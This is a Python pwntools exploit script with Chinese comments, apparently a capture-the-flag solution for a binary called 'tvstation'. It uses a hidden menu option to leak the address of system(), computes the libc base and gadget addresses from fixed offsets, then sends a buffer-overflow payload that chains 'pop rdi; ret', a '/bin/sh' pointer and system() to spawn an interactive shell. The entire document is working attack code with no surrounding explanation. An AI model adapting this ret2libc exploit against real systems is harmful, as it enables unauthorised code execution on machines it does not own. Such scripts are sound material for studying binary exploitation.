#!/usr/bin/python
#coding:utf-8

from pwn import *

io = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './tvstation'], env={"LD_PRELOAD":"./libc.so.6_x64"})



io.recvuntil(": ")
io.sendline('4')					#跳转到隐藏选项
io.recvuntil("@0x")



system_addr = int(io.recv(12), 16)	#读取输出的system函数在内存中的地址
libc_start = system_addr - 0x456a0	#根据偏移计算libc在内存中的首地址
pop_rdi_addr = libc_start + 0x19b83a	#pop rdi; ret 在内存中的地址，给system函数传参
binsh_addr = libc_start + 0x18ac40	#"/bin/sh"字符串在内存中的地址

payload = ""
payload += 'A'*40					#padding
payload += p64(pop_rdi_addr)		#pop rdi; ret
payload += p64(binsh_addr)			#system函数参数
payload += p64(system_addr)			#调用system()执行system("/bin/sh")

io.sendline(payload)

io.interactive()
